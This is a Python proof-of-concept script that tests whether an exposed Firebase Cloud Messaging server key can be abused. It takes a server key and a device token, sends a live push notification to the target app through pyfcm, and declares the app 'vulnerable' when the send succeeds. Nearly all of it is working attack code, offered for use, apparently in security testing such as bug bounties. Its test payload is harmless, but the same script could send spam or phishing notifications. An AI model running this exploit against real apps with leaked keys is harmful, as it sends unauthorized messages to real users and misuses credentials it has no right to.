import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from pyfcm import FCMNotification

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC BY: http://github.com/MazX0p \\ Mohamed Alzhrani                                    \033[0m')
    print('+  \033[34mTARGET:  FireBase Push Notification With Fcm server key                                 \033[0m')
    print('+  \033[36mUSAGE:  python3 FcmPushNotification.py                                                           \033[0m')
    print('+------------------------------------------')

def POC_1(fcm_server_key, iid):
    Notification_push = FCMNotification(api_key=fcm_server_key)
    ClientAppIID = iid
    MT = "FCM POC"
    MB = "FCM test"

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = Notification_push.notify_single_device(registration_id=ClientAppIID, message_title=MT, message_body=MB,dry_run=False)

        if response.status_code == 200 :
            print("\033[32m[+] b1ng it's vulnerable, Notification sent to Client App \033[0m")
        elif response.status_code == 401:
                print("\033[31m[x] Authorization header is invalid \033[0m")
        elif response.status_code == 403:
               print("\033[31m[x] Authorization header doesn't match the AuthorizedEntity \033[0m")
    except Exception as e:
        print("\033[31m[x] OH NO! There was an error authenticating the sender account \033[0m")

if __name__ == '__main__':
    title()
    fcm_server_key = str(input("\033[35minput FCM Server Key \nServer Key   >>> \033[0m"))
    iid = str(input("\033[35minput Client app iid token\nIID Token    >>> \033[0m"))
    POC_1(fcm_server_key, iid)
